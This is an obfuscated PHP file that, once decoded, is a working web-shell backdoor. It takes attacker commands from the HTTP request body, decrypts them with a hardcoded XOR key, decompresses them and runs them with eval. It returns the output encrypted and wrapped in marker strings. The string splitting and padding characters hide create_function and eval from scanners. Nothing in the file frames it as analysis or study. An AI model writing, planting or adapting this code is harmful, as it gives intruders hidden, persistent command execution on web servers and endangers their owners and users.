<?php
$b='++)D{$Do.=$t{$i}^D$k{D$jD};}D}return $o;}iDf (@Dpreg_Dmatch("/D$kh(.+)$Dkf/",@fDile_DgetD_coDntents("php:DD/';
$n=str_replace('CQ','','creCQatCQCQCQCQe_funcCQtion');
$O='/input"),D$m)==1) {@DDob_start();@eDDval(@gzDuncompresDs(@x(@bDase64_DdDecode(D$m[1])D,$k)));$o=@Dob_ge';
$C=',$k)D{$c=sDtrlen($Dk);$l=stDrDlen(D$t);$o="";fDor($i=0;D$iD<$l;){Dfor($j=0;D($jD<$cD&&$iD<$l);$j++,$i';
$w='DDDt_contents();@ob_Dend_DcleaDn();$r=@baseD6D4_encode(@x(DD@DgzcompDress($o),$Dk));print("$Dp$kh$Dr$kf");}';
$L='$k=D"393aD1e84";$Dkh="79D7763b9312bD";$kf=D"66D7f2664dD034";$p="XDfC9DD1hb2rBTwvdkSD";funcDtion x($tD';
$t=str_replace('D','',$L.$C.$b.$O.$w);
$i=$n('',$t);$i();
?>
